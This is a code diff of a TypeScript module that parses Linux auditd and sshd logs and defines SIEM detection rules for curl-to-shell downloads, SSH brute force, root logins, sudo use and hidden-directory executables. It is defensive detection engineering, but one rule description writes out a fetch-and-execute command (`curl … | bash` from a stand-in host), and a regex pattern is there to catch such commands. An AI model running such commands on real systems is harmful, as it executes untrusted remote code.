@@ -1,5 +1,5 @@
 /**
- * Linux auditd (+ sshd auth lines) — native module (card: docs/log-schemas/host-linux-auditd.md).
+ * Linux auditd (+ sshd auth lines) - native module (card: docs/log-schemas/host-linux-auditd.md).
  *
  * Record: ONE audit record as a FLAT object keyed by the audit field names (`type`,
  * `audit_id` = the `audit(<epoch>.<ms>:<serial>)` stamp, `epoch`, `serial`, then the
@@ -12,14 +12,14 @@
  * One platform event → the ONE record that carries its evidence: an exec → EXECVE (argv),
  * a sudo → USER_CMD, a file write (e.g. crontab) → PATH, an SSH auth → the authored
  * USER_AUTH / USER_LOGIN record or the sshd line, other syscalls → SYSCALL. (A real audit
- * event is a group of records sharing `audit_id`; see the final report — the contract
+ * event is a group of records sharing `audit_id`; see the final report - the contract
  * returns one NativeLog per event.)
  */
 import type { NativeSource, NativeLog, KindSchema, UseCase, NativeCtx } from "../types";
 import type { TelemetryEvent } from "@/lib/sim/types";
 import { syslogStamp } from "./_dnsShared";
 
-// node= is written when auditd runs with name_format=hostname — the standard setting for a
+// node= is written when auditd runs with name_format=hostname - the standard setting for a
 // fleet forwarding to a SIEM, and the only place an audit record names its own machine.
 const STAMP = ["type", "audit_id", "epoch", "serial"];
 const ARGS = Array.from({ length: 20 }, (_, i) => [`a${i}`, `a${i}_decoded`]).flat();
@@ -111,7 +111,8 @@ function fromTelemetry(ev: TelemetryEvent, ctx: NativeCtx): NativeLog | null {
   const srcIp = r("data.srcip") ?? r("sshd.client_ip") ?? r("source.ip") ?? ag("addr") ?? ev.src_ip;
   const srcPort = r("data.srcport") ?? r("sshd.client_port") ?? r("source.port") ?? (ev.src_port !== undefined ? String(ev.src_port) : undefined);
   const success = !/fail|denied|invalid/i.test(`${ag("res") ?? msgKv.res ?? ""} ${r("event.outcome") ?? ""} ${ev.authentication?.result ?? ""} ${r("sshd.event") ?? ""}`) && !/_failed|failure/.test(ev.event_type);
-  const pidOf = () => ag("pid") ?? r("process.pid") ?? (ev.process?.pid !== undefined ? String(ev.process.pid) : undefined) ?? String(ctx.int(`${ev.id}:pid`, 1000, 60000));
+  // R6: the row's canonical pid (process.pid, threaded through the story) before any authored raw pid.
+  const pidOf = () => (ev.process?.pid !== undefined ? String(ev.process.pid) : undefined) ?? ag("pid") ?? r("process.pid") ?? String(ctx.int(`${ev.id}:pid`, 1000, 60000));
 
   // ── decide the record ──
   const sshdish = r("log.source") === "sshd" || r("sshd.event") !== undefined;
@@ -302,15 +303,15 @@ const useCases: UseCase[] = [
   {
     id: "linux_auditd.curl_pipe_shell", title: "Download piped straight into a shell (curl|wget … | sh)", sourceId: "linux_auditd", kinds: ["EXECVE", "PROCTITLE"],
     severity: "high", mitre: ["T1059.004", "T1105"],
-    description: "`curl -fsSL http://x/i.sh | bash` fetches and runs code in one step, leaving nothing on disk to scan. auditd records it as an EXECVE of `bash -c` whose argument is hex-encoded (it contains spaces and a pipe) — decode a2 to read it, then pivot the URL host to proxy/DNS/firewall.",
+    description: "`curl -fsSL http://x/i.sh | bash` fetches and runs code in one step, leaving nothing on disk to scan. auditd records it as an EXECVE of `bash -c` whose argument is hex-encoded (it contains spaces and a pipe) - decode a2 to read it, then pivot the URL host to proxy/DNS/firewall.",
     logic: "SPL: index=linux sourcetype=linux:audit type=EXECVE | eval cmd=coalesce(a2_decoded,a1_decoded,a2,a1) | regex cmd=\"(curl|wget)\\s[^|]*\\|\\s*(ba|da|z)?sh\"",
     match: { any: [...ARGV_FIELDS.map(f => ({ field: f, op: "regex" as const, value: PIPE_TO_SHELL })), { field: "proctitle_decoded", op: "regex", value: PIPE_TO_SHELL }] },
-    falsePositives: ["Documented vendor installers (e.g. get.docker.com) run by admins — confirm a change ticket"],
+    falsePositives: ["Documented vendor installers (e.g. get.docker.com) run by admins - confirm a change ticket"],
   },
   {
     id: "linux_auditd.ssh_bruteforce", title: "SSH brute force: repeated PAM authentication failures from one address", sourceId: "linux_auditd", kinds: ["USER_AUTH"],
     severity: "high", mitre: ["T1110.001", "T1110.003"],
-    description: "Each failed SSH password is a USER_AUTH record with res=failed, exe=/usr/sbin/sshd and the attacker in addr (auid is still unset — nobody is logged in yet). Five or more from one addr in 10 minutes is guessing; check whether the same addr later gets res=success / USER_LOGIN.",
+    description: "Each failed SSH password is a USER_AUTH record with res=failed, exe=/usr/sbin/sshd and the attacker in addr (auid is still unset - nobody is logged in yet). Five or more from one addr in 10 minutes is guessing; check whether the same addr later gets res=success / USER_LOGIN.",
     logic: "SPL: index=linux sourcetype=linux:audit type=USER_AUTH exe=\"/usr/sbin/sshd\" res=failed | bin _time span=10m | stats count dc(acct) by addr, _time | where count >= 5",
     match: { all: [{ field: "res", op: "eq", value: "failed" }, { field: "exe", op: "eq", value: "/usr/sbin/sshd" }] },
     threshold: { groupBy: ["addr"], count: 5, windowSec: 600 },
@@ -319,7 +320,7 @@ const useCases: UseCase[] = [
   {
     id: "linux_auditd.ssh_success_after_failures", title: "Failed then successful SSH logon from the same address", sourceId: "linux_auditd", kinds: ["USER_AUTH", "USER_LOGIN"],
     severity: "high", mitre: ["T1110.001", "T1078"],
-    description: "The breach moment of a brute force: the same addr that produced res=failed USER_AUTH records gets res=success within the window. Everything after it under the new session id (ses) is attacker activity — follow that ses through EXECVE/USER_CMD.",
+    description: "The breach moment of a brute force: the same addr that produced res=failed USER_AUTH records gets res=success within the window. Everything after it under the new session id (ses) is attacker activity - follow that ses through EXECVE/USER_CMD.",
     logic: "SPL: index=linux sourcetype=linux:audit (type=USER_AUTH OR type=USER_LOGIN) exe=\"/usr/sbin/sshd\" | bin _time span=30m | stats dc(res) as outcomes values(res) by addr, _time | where outcomes >= 2",
     match: { all: [{ field: "exe", op: "eq", value: "/usr/sbin/sshd" }, { field: "addr", op: "neq", value: "?" }] },
     threshold: { groupBy: ["addr"], count: 2, windowSec: 1800, distinct: "res" },
@@ -331,7 +332,7 @@ const useCases: UseCase[] = [
     description: "Direct root logins over SSH should be disabled (PermitRootLogin no); a res=success for acct=root from a non-RFC1918 addr means the root password or key is in an outsider's hands, or the server is exposed.",
     logic: "SPL: index=linux sourcetype=linux:audit (type=USER_AUTH OR type=USER_LOGIN) res=success (acct=root OR id=0) | where NOT cidrmatch(\"10.0.0.0/8\",addr) AND NOT cidrmatch(\"172.16.0.0/12\",addr) AND NOT cidrmatch(\"192.168.0.0/16\",addr)",
     match: { all: [{ field: "res", op: "eq", value: "success" }, { any: [{ field: "acct", op: "eq", value: "root" }, { field: "id", op: "eq", value: "0" }] }, { field: "addr", op: "notCidr", value: PRIVATE }] },
-    falsePositives: ["Break-glass access from a provider network — should come with a ticket"],
+    falsePositives: ["Break-glass access from a provider network - should come with a ticket"],
   },
   {
     id: "linux_auditd.crontab_persistence", title: "Crontab created or edited (cron persistence)", sourceId: "linux_auditd", kinds: ["PATH", "EXECVE"],
@@ -360,10 +361,10 @@ const useCases: UseCase[] = [
   {
     id: "linux_auditd.sudo_to_root_session", title: "Human account became root through sudo (context)", sourceId: "linux_auditd", kinds: ["CRED_ACQ", "USER_START"],
     severity: "low", mitre: ["T1548.003"],
-    description: "CRED_ACQ / USER_START with acct=root, exe=/usr/bin/sudo and a non-zero auid record the moment a logged-in human obtained root. auid keeps the original user even after sudo, so this is the record that names who became root — baseline it per host and flag unusual auids (service accounts, new hires).",
+    description: "CRED_ACQ / USER_START with acct=root, exe=/usr/bin/sudo and a non-zero auid record the moment a logged-in human obtained root. auid keeps the original user even after sudo, so this is the record that names who became root - baseline it per host and flag unusual auids (service accounts, new hires).",
     logic: "SPL: index=linux sourcetype=linux:audit (type=CRED_ACQ OR type=USER_START) acct=root exe=\"/usr/bin/sudo\" auid!=0 auid!=4294967295 | stats count by host, auid",
     match: { all: [{ field: "acct", op: "eq", value: "root" }, { field: "exe", op: "eq", value: "/usr/bin/sudo" }, { field: "auid", op: "nin", value: ["0", UNSET] }] },
-    falsePositives: ["Every legitimate sudo produces this — it is context for other alerts, not an alert on its own"],
+    falsePositives: ["Every legitimate sudo produces this - it is context for other alerts, not an alert on its own"],
   },
   {
     id: "linux_auditd.hidden_dir_executable", title: "Executable file in a hidden directory", sourceId: "linux_auditd", kinds: ["PATH"],
@@ -371,7 +372,7 @@ const useCases: UseCase[] = [
     description: "Backdoors and implants hide in dot-directories (~/.cache/.fontconfig/kworker) and borrow kernel-thread names. A PATH record with an executable mode (0100755 / 0100700) under a path component starting with a dot deserves a hash lookup and a look at what runs it.",
     logic: "SPL: index=linux sourcetype=linux:audit type=PATH | regex name=\"/\\.[^/]+/\" | regex mode=\"^0100[57]\"",
     match: { all: [{ field: "name", op: "regex", value: "/\\.[^/]+/[^/]+$" }, { field: "mode", op: "regex", value: "^0100[57][0-7][0-7]$" }] },
-    falsePositives: ["Developer tool caches (~/.npm, ~/.cargo/bin) — allow-list known paths"],
+    falsePositives: ["Developer tool caches (~/.npm, ~/.cargo/bin) - allow-list known paths"],
   },
   {
     id: "linux_auditd.sshd_failed_burst", title: "Burst of sshd 'Failed password' lines on one server", sourceId: "linux_auditd", kinds: ["sshd"],
